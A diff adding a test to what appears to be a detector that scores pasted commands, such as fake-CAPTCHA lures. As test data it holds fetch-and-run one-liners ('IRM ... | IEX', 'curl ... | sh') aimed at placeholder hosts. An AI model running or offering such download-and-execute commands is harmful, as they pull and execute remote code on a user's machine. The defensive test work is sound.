@@ -67,6 +67,12 @@ describe('command scoring', () => {
     expect(evaluateCommand(plain, rules, { pageReported: true }).level).toBe('block');
   });
 
+  it('finds download addresses written without a scheme', () => {
+    expect(extractTargets('IRM x.example.invalid/Katy7684/raw/main/95c9 | IEX')).toContain('https://x.example.invalid/Katy7684/raw/main/95c9');
+    expect(extractTargets('curl -fsSL get.example.invalid/install.sh | sh')).toContain('https://get.example.invalid/install.sh');
+    expect(extractTargets('irm https://x.example.invalid/a | iex')).toEqual(['https://x.example.invalid/a']);
+  });
+
   it('never blocks text without anything that runs', () => {
     const v = evaluateCommand('# I am not a robot - reCAPTCHA Verification ID: 4821', rules, { pageScore: 50, trigger: 'captcha' });
     expect(v.gate).toBe(false);
